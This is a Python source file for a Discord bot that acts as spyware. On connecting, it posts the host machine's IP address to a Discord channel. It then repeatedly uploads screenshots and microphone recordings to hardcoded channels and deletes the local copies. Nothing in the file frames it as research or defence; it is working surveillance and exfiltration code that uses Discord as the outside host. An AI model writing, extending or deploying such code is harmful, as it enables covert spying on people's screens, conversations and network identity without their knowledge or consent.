import discord
from discord.ext import commands
import os
import socket
import time
import asyncio
from screen import Screenshot, Microphone
from dotenv import load_dotenv
load_dotenv(".env")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=';', intents=intents)
recording = False
guild_id = "1198070162432200865"
screenshot_channel = "1209205802032955413"
microphone_channel = "1209237919592615937"
connect_channel = "1209247219874668638"

microphone = Microphone()
screenshot = Screenshot()  

async def sendMic(ctx):
    mic_path = microphone.name
    if not mic_path:
        print("Microphone path is empty.")
        return

    guild = await bot.fetch_guild(guild_id)
    channel = await guild.fetch_channel(microphone_channel)

    with open(mic_path, 'rb') as screenshot_file:
        await channel.send(file=discord.File(screenshot_file, mic_path))
        
    os.remove(mic_path) # COMMENT OUT IF YOU WANT TO KEEP IT

@bot.command("sendScreen")
async def sendScreen(ctx):
    for file in os.listdir("files"):
        screenshot_path = file.replace(".wav", "")
    
    screenshot_path = screenshot.name
    if not screenshot_path:
        print("Screenshot path is empty.")
        return

    guild = await bot.fetch_guild(guild_id)
    channel = await guild.fetch_channel(screenshot_channel)

    with open(screenshot_path, 'rb') as screenshot_file:
        await channel.send(file=discord.File(screenshot_file, screenshot_path)) 

    screenshot_path = screenshot.name
    os.remove(screenshot_path) # COMMENT OUT IF YOU WANT TO KEEP IT

@bot.event
async def on_ready():
    guild = await bot.fetch_guild(guild_id)
    channel = await guild.fetch_channel(connect_channel)

    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)

    await channel.send(f"{ip_address} connected at {time.strftime('%m/%d %H:%M:%S')}")

@bot.event
async def on_message(message):
    while True:
        for file in os.listdir("files"):
            if file.endswith(".png"):
                await sendScreen(ctx=message)
        
        for file in os.listdir("files"):
            if file.endswith(".wav"):
                await sendMic(ctx=message)

bot.run(os.getenv("TOKEN"))